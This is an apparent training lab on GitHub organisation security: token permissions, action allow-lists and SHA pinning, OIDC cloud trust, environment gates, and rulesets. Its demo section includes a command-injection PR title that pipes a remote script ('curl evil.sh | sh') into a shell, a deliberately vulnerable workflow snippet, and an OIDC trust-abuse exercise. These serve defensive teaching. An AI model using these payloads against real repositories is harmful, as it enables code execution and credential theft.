# Lab 06-03 - Security and governance: OIDC, token permissions, allow-list, rulesets, environments

## Goal
Lock the org down by default: read-only `GITHUB_TOKEN`, allow-listed actions that must be SHA-pinned, OIDC to the cloud, environments with reviewers, rulesets that require the platform workflow before merge.

## Prereqs
Org owner rights, `gh` with `admin:org` scope (`gh auth refresh -s admin:org`).

## Step 1 - Org defaults: read-only token, no PR approvals by Actions
```bash
ORG=acme-lab-<you>
gh api -X PUT /orgs/$ORG/actions/permissions/workflow \
  -f default_workflow_permissions=read -F can_approve_pull_request_reviews=false
gh api /orgs/$ORG/actions/permissions/workflow
```
Expected: `"default_workflow_permissions":"read"`. Why: a compromised step then cannot push code or create releases. Workflows opt in per job to `contents: write` etc.

## Step 2 - Allow-list actions and require SHA pinning
```bash
gh api -X PUT /orgs/$ORG/actions/permissions \
  -f enabled_repositories=all -f allowed_actions=selected -F sha_pinning_required=true
gh api -X PUT /orgs/$ORG/actions/permissions/selected-actions \
  -F github_owned_allowed=true -F verified_allowed=false \
  -f 'patterns_allowed[]=acme-lab-<you>/*' \
  -f 'patterns_allowed[]=docker/*' -f 'patterns_allowed[]=sigstore/cosign-installer@*' \
  -f 'patterns_allowed[]=aquasecurity/trivy-action@*' -f 'patterns_allowed[]=anchore/sbom-action@*'
```
(`sha_pinning_required` is the newer org-level control; if your plan lacks it, enforce with a required workflow that greps `uses:` lines, step 6.) Why not "verified creators": verified != audited. Review each new action (source, maintainers, permissions), request via a PR to an allow-list file in the platform repo, apply with `gh api` in CI.

Verify: a repo using `uses: some/random-action@v1` fails at startup with "action is not allowed".

## Step 3 - OIDC to Azure (and the AWS/GCP shape)
Azure (done in Module 05 Lab 06). The workflow side:
```yaml
permissions: { id-token: write, contents: read }
steps:
  - uses: azure/login@SHA
    with:
      client-id: ${{ vars.AZURE_CLIENT_ID }}
      tenant-id: ${{ vars.AZURE_TENANT_ID }}
      subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
```
AWS: IAM role with trust policy condition `token.actions.githubusercontent.com:sub = repo:org/repo:environment:prod` and `aud = sts.amazonaws.com`, then `aws-actions/configure-aws-credentials` with `role-to-assume`. GCP: Workload Identity Pool + provider with attribute condition `assertion.repository=='org/repo'`.
Key rule: **always constrain `sub`** (repo + environment/ref). A trust policy on only the org is an open door. Customise the claim template so reusable workflows are visible: `job_workflow_ref` lets cloud trust only the platform workflow:
```bash
gh api -X PUT /repos/$ORG/payments-api/actions/oidc/customization/sub \
  -F use_default=false -f 'include_claim_keys[]=repo' -f 'include_claim_keys[]=context'
```

## Step 4 - Environments with required reviewers and branch restriction
```bash
gh api -X PUT /repos/$ORG/payments-api/environments/prd \
  -F 'deployment_branch_policy[protected_branches]=false' \
  -F 'deployment_branch_policy[custom_branch_policies]=true' \
  -F 'wait_timer=5' \
  -F 'reviewers[][type]=Team' -F "reviewers[][id]=$(gh api /orgs/$ORG/teams/team-payments --jq .id)"
gh api -X POST /repos/$ORG/payments-api/environments/prd/deployment-branch-policies -f name=main
```
Prevent self-review: add `-F prevent_self_review=true`. Environment secrets/vars (and OIDC subject `environment:prd`) exist only for jobs that pass the gate.

## Step 5 - Rulesets: branch protection as code, org-wide
```bash
cat > ruleset.json <<'EOF'
{
  "name": "main-protection",
  "target": "branch",
  "enforcement": "active",
  "conditions": { "ref_name": { "include": ["~DEFAULT_BRANCH"], "exclude": [] },
                  "repository_name": { "include": ["~ALL"], "exclude": [] } },
  "rules": [
    { "type": "pull_request", "parameters": {
        "required_approving_review_count": 1,
        "dismiss_stale_reviews_on_push": true,
        "require_code_owner_review": true,
        "require_last_push_approval": true,
        "required_review_thread_resolution": true } },
    { "type": "required_status_checks", "parameters": {
        "strict_required_status_checks_policy": true,
        "required_status_checks": [ { "context": "ci / build" } ] } },
    { "type": "non_fast_forward" },
    { "type": "deletion" },
    { "type": "required_signatures" }
  ],
  "bypass_actors": [ { "actor_id": 1, "actor_type": "OrganizationAdmin", "bypass_mode": "pull_request" } ]
}
EOF
gh api -X POST /orgs/$ORG/rulesets --input ruleset.json
gh api /orgs/$ORG/rulesets --jq '.[] | {id,name,enforcement}'
```
Use `"enforcement": "evaluate"` first (dry run, shows what would be blocked in the Rule Insights), then flip to `active`. Manage rulesets in Terraform (`github_organization_ruleset`) in practice (Module 05).

## Step 6 - Required workflows via ruleset (the platform's enforcement hook)
Add a rule `{"type":"workflow","parameters":{"workflows":[{"repository_id":<platform-repo-id>,"path":".github/workflows/policy-check.yml","ref":"refs/tags/v1"}]}}`. `policy-check.yml` verifies: `permissions:` declared, all `uses:` SHA-pinned, no `pull_request_target` with checkout of PR head, no `secrets: inherit` to untrusted. Implement with `actionlint` + a small `zizmor` run (static analysis for Actions security):
```bash
pip install zizmor actionlint-py 2>/dev/null; zizmor .github/workflows/
```
Expected: findings such as `unpinned-uses`, `excessive-permissions`, `template-injection`. Fix each.

## Step 7 - Script-injection and `pull_request_target`
```yaml
# BAD: attacker-controlled title runs as shell
- run: echo "${{ github.event.pull_request.title }}"
# GOOD: pass via env, quote it
- run: echo "$TITLE"
  env: { TITLE: "${{ github.event.pull_request.title }}" }
```
`pull_request_target` runs with secrets in the base repo context; never check out and run PR head code in it.

## Break it on purpose
1. Create a PR whose title is `"; curl evil.sh | sh #` against the BAD snippet in a sandbox repo; show execution; fix with env.
2. Add `uses: actions/checkout@v4` (tag) and watch the allow-list/pinning policy reject it.
3. Create an Azure federated credential with a wildcard-ish subject and prove another repo can assume it (sandbox only), then tighten.

## Cleanup
Keep the ruleset in `evaluate` mode if you need to keep working freely.

## Talking points
Defaults deny; least-privilege token and OIDC subjects; SHA pins + allow-list; environments for approvals; rulesets/required workflows to enforce centrally; know the injection and `pull_request_target` pitfalls.
